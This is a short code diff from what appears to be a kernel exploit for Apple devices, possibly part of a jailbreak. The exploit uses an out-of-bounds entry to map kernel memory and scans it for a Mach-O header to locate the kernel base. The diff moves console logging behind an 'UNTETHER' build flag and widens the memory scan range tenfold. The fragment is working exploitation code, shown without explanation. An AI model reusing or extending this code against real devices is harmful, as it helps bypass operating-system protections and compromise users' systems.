@@ -19,7 +19,7 @@ void print_log(const char *fmt, ...) {
     syslog(LOG_ERR, "%s", buf);
     fprintf(stderr, "%s", buf);
     fflush(stderr);
-
+#ifdef UNTETHER
     static int console_fd = -1;
     if (console_fd < 0) {
         console_fd = open("/dev/console", O_WRONLY | O_NOCTTY);
@@ -32,6 +32,7 @@ void print_log(const char *fmt, ...) {
         }
         fsync(console_fd);
     }
+#endif
 }
 
 int create_oob_entry(void) {
@@ -217,9 +218,8 @@ int run_exploit(void) {
     if (create_oob_entry() != 0) goto done;
     print_log("[*] main_entry: 0x%x\n", kinfo->main_entry);
     print_log("[*] oob_entry: 0x%x\n", kinfo->oob_entry);
-
-    uint8_t *mapped = map_relative_data(0, 0x1000000, VM_PROT_READ);
-    for (uint32_t i = 0; i < 0x1000000; i+=0x1000) {
+    uint8_t *mapped = map_relative_data(0, 0x10000000, VM_PROT_READ);
+    for (uint32_t i = 0; i < 0x10000000; i+=0x1000) {
         if (*(uint32_t *)(mapped + i) == MH_MAGIC && *(uint32_t *)(mapped + i + 0xc) == MH_EXECUTE) {
             kinfo->mapping_base = kinfo->kernel_phys_base - i;
             kinfo->kernel_base = *(uint32_t *)(mapped + i + 0x34);
@@ -230,7 +230,7 @@ int run_exploit(void) {
         }
     }
 
-    unmap_data(mapped, 0x1000000);
+    unmap_data(mapped, 0x10000000);
     if (kinfo->mapping_base == 0) goto done;
     print_log("[*] mapping_base: 0x%x\n", kinfo->mapping_base);
     print_log("[*] kernel_base: 0x%x\n", kinfo->kernel_base);
